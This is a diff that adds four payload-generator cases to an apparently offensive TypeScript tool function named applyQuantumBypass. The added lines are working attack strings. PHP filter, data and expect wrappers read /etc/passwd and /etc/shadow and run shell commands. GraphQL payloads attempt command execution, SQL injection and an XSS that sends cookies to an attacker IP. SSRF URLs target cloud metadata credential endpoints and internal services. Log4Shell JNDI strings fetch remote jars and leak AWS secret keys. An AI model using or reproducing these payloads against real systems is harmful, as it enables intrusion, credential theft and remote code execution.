@@ -620,6 +620,122 @@ export function applyQuantumBypass(
     case "antiforensics":
       return buildAntiForensicsPayloads(raw).join("\n");
 
+    case "php_wrapchain": {
+      const b64raw  = Buffer.from(raw).toString("base64");
+      const rot13   = raw.replace(/[a-zA-Z]/g, (c) => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = String.fromCharCode(c.charCodeAt(0) + 13)).charCodeAt(0) ? c.charCodeAt(0) : c.charCodeAt(0) - 26));
+      return [
+        `php://filter/convert.base64-encode/resource=/etc/passwd`,
+        `php://filter/read=convert.base64-encode/resource=/etc/shadow`,
+        `php://filter/read=convert.base64-encode/resource=index.php`,
+        `php://filter/read=convert.base64-encode/resource=config.php`,
+        `php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd`,
+        `php://filter/read=string.rot13/resource=/etc/passwd`,
+        `data://text/plain,<?php system('${raw.replace(/'/g, "\\'")}'); ?>`,
+        `data://text/plain;base64,${Buffer.from(`<?php system('${raw.replace(/'/g, "\\'")}'); ?>`).toString("base64")}`,
+        `data://text/plain;base64,${Buffer.from(`<?php passthru(base64_decode('${b64raw}')); ?>`).toString("base64")}`,
+        `expect://${raw}`,
+        `php://filter/read=convert.base64-encode|string.rot13/resource=/etc/passwd`,
+        `php://filter/string.rot13|convert.base64-encode/resource=/etc/passwd`,
+        `phar://./uploads/shell.phar/shell.php?c=${encodeURIComponent(raw)}`,
+        `zip://uploads/shell.zip%23shell.php`,
+        `php://filter/read=convert.base64-encode/resource=php://filter/read=convert.base64-encode/resource=/etc/passwd`,
+        `compress.zlib:///etc/passwd`,
+        `compress.bzip2:///etc/passwd`,
+        `glob:///etc/pa*`,
+        `php://filter/read=string.toupper|string.rot13/resource=/etc/passwd`,
+        `data://text/plain;base64,${Buffer.from(`<?php $c=base64_decode('${b64raw}');$f=tempnam(sys_get_temp_dir(),'nx');file_put_contents($f,$c);system($f);unlink($f); ?>`).toString("base64")}`,
+        `php://filter/convert.base64-encode/resource=php://input`,
+        `data://text/plain,<?php $v=shell_exec('${raw.replace(/'/g, "\\'")}');echo $v; ?>`,
+        `php://filter/string.rot13/resource=data://text/plain,${rot13}`,
+      ].join("\n");
+    }
+
+    case "graphql_rce": {
+      const esc = raw.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+      return [
+        `{"query":"mutation{__typename}"}`,
+        `{"query":"{__schema{queryType{name}types{name,kind,fields{name,args{name,type{name}}}}}}"}`,
+        `{"query":"mutation{systemCommand(cmd:\\"${esc}\\"){output}}"}`,
+        `{"query":"mutation{exec(command:\\"${esc}\\"){result}}"}`,
+        `{"query":"mutation{runCommand(input:\\"${esc}\\"){stdout}}"}`,
+        `{"query":"mutation{shell(cmd:\\"${esc}\\"){out}}"}`,
+        `{"query":"{user(id:\\"1 UNION SELECT 1,2,load_file('/etc/passwd'),4--\\"){id}}"}`,
+        `{"query":"{users{id username email password resetToken isAdmin}}"}`,
+        `{"query":"query{...A}fragment A on Query{users{password secretToken apiKey}}"}`,
+        `{"query":"mutation{updateProfile(input:{bio:\\"<img src=x onerror=fetch('http://${attackerIp}:${attackerPort}/?c='+btoa(document.cookie))>\\"}){id}}"}`,
+        `{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}}}}"}`,
+        `[{"query":"{__typename}"},{"query":"mutation{systemCommand(cmd:\\"${esc}\\"){output}}"}]`,
+        `{"query":"subscription{systemLog{line}}"}`,
+        `{"query":"mutation{fileRead(path:\\"/etc/passwd\\"){content}}"}`,
+        `{"query":"mutation{fileWrite(path:\\"/tmp/nx_$$\\",content:\\"${esc}\\"){ok}}"}`,
+        `{"operationName":null,"variables":{},"query":"mutation{exec(command:\\"${esc}\\"){result}}"}`,
+      ].join("\n");
+    }
+
+    case "ssrf": {
+      const lh = attackerIp;
+      const lp = attackerPort;
+      return [
+        `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
+        `http://169.254.169.254/latest/meta-data/`,
+        `http://169.254.169.254/latest/user-data`,
+        `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`,
+        `http://metadata.google.internal/computeMetadata/v1/project/project-id`,
+        `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
+        `http://169.254.169.254/metadata/v1/`,
+        `http://100.100.100.200/latest/meta-data/`,
+        `http://[::1]:22/`,
+        `http://[::1]:6379/`,
+        `http://127.0.0.1:6379/\r\nSET nx_probe 1\r\nSAVE\r\n`,
+        `http://127.0.0.1:2375/v1.43/containers/json`,
+        `http://127.0.0.1:10250/pods`,
+        `http://127.0.0.1:8500/v1/agent/self`,
+        `http://${lh}:${lp}/ssrf_probe`,
+        `http://0.0.0.0:80/`,
+        `http://0x7f000001/`,
+        `http://2130706433/`,
+        `http://[0:0:0:0:0:ffff:127.0.0.1]/`,
+        `dict://127.0.0.1:6379/CONFIG:GET:*`,
+        `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a`,
+        `file:///etc/passwd`,
+        `file:///proc/self/environ`,
+        `ftp://127.0.0.1:21/`,
+        `sftp://127.0.0.1/etc/passwd`,
+        `ldap://127.0.0.1:389/`,
+        `http://localtest.me/`,
+        `http://spoofed.burpcollaborator.net.${lh}/`,
+        `http://127.1/`,
+        `http://0177.0.0.1/`,
+      ].join("\n");
+    }
+
+    case "jar_url": {
+      const lh = attackerIp;
+      const lp = attackerPort;
+      return [
+        `jar:http://${lh}:${lp}/malicious.jar!/`,
+        `jar:ftp://${lh}:${lp}/evil.jar!/com/pwn/Shell.class`,
+        `jar:http://${lh}:${lp}/shell.jar!/shell`,
+        `\${jndi:ldap://${lh}:${lp}/a}`,
+        `\${jndi:rmi://${lh}:${lp}/exploit}`,
+        `\${jndi:dns://${lh}:${lp}/probe}`,
+        `\${jndi:corba://${lh}:${lp}/obj}`,
+        `\${jndi:iiop://${lh}:${lp}/obj}`,
+        `\${jndi:\${lower:l}dap://${lh}:${lp}/x}`,
+        `\${j\${::-n}\${::-d}\${::-i}:\${::-r}\${::-m}\${::-i}://${lh}:${lp}/x}`,
+        `java.rmi.server.codebase=http://${lh}:${lp}/exploit.jar`,
+        `http://${lh}:${lp}/exploit.jar#com.pwn.Shell`,
+        `-jar http://${lh}:${lp}/rce.jar`,
+        `\${jndi:ldap://${lh}:${lp}/\${env:AWS_SECRET_ACCESS_KEY}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${hostName}}`,
+        `\${jndi:ldap://${lh}:${lp}/\${sys:java.class.path}}`,
+        `\${jndi:ldap://\${env:NaN:-${lh}}:${lp}/x}`,
+        `\${jndi:ldap://${lh}:${lp}/\${java:version}}`,
+        `http://${lh}:${lp}/pwn.jar`,
+        `\${jndi:ldap://${lh}:${lp}/ExploitRMI/remoteIp/${lh}/remotePort/${lp}/command/${Buffer.from(raw).toString("hex")}}`,
+      ].join("\n");
+    }
+
     default:
       return raw;
   }
